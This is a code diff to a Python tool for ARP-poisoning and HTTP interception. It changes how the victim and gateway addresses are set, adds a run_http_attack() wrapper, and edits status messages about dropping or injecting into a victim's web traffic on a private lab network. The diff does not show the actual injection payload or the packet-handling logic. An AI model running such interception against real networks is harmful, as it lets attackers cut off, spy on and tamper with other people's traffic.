@@ -20,19 +20,16 @@ init(autoreset=True)
 # Import centralized configuration
 from config import NetworkConfig, AttackConfig, SecurityConfig, PathConfig
 
-# Use configuration values
-victim_ip = AttackConfig.VICTIM_IP
-gateway_ip = AttackConfig.GATEWAY_IP
+# Use configuration values - these will be set dynamically by run_http_attack()
+victim_ip = None  # Will be set by run_http_attack()
+gateway_ip = None  # Will be set by run_http_attack()
 interface = NetworkConfig.INTERFACE
-victim_mac = AttackConfig.VICTIM_MAC
-gateway_mac = AttackConfig.GATEWAY_MAC
+victim_mac = None  # Will be set by run_http_attack()
+gateway_mac = None  # Will be set by run_http_attack()
 
 # Get current HTTP attack mode and injection payload
 HTTP_ATTACK_MODE = AttackConfig.HTTP_ATTACK_MODE
-injection_code = AttackConfig.INJECTION_PAYLOADS.get(
-    AttackConfig.CURRENT_PAYLOAD,
-    AttackConfig.INJECTION_CODE
-)
+injection_code = AttackConfig.INJECTION_CODE
 
 # Use the original simple injection code instead of complex HTML blocks
 html_injection_block = injection_code
@@ -760,7 +757,7 @@ def start_packet_interception():
         print(f"{Fore.RED}⚠️  Victim will be unable to browse HTTP sites{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}💡 HTTPS sites will still work (encrypted){Style.RESET_ALL}")
         print(f"{Fore.CYAN}🔍 Debug logging enabled - watch for [DROP-DEBUG] messages{Style.RESET_ALL}")
-        print(f"{Fore.BLUE}💡 Try browsing to http://192.168.0.125:8000 from victim (192.168.0.201){Style.RESET_ALL}")
+        print(f"{Fore.BLUE}💡 Try browsing to http://192.168.68.125:8000 from victim (192.168.68.201){Style.RESET_ALL}")
     
     print(f"{Fore.WHITE}🛑 Press Ctrl+C to stop and view statistics{Style.RESET_ALL}")
     
@@ -776,7 +773,7 @@ def start_packet_interception():
             
             if HTTP_ATTACK_MODE == "DROP" and stats.total_packets == 0:
                 logger.info(f"[STATUS] 💡 No packets detected - Check ARP poisoning is working")
-                logger.info(f"[STATUS] 💡 From victim (192.168.0.201), try: http://192.168.0.125:8000")
+                logger.info(f"[STATUS] 💡 From victim (192.168.68.201), try: http://192.168.68.125:8000")
     
     status_thread = threading.Thread(target=status_logger, daemon=True)
     status_thread.start()
@@ -926,6 +923,21 @@ def main():
 
     # Start HTTP interception
     start_packet_interception()
+
+def run_http_attack(victim_device, gateway_device, mode):
+    """Run HTTP attack with specified devices and mode"""
+    
+    # Override the global variables with new device data
+    global victim_ip, victim_mac, gateway_ip, gateway_mac, HTTP_ATTACK_MODE
+    
+    victim_ip = victim_device['ip']
+    victim_mac = victim_device['mac']
+    gateway_ip = gateway_device['ip']
+    gateway_mac = gateway_device['mac']
+    HTTP_ATTACK_MODE = mode
+    
+    # Run the main function
+    main()
 
 if __name__ == "__main__":
     main() 
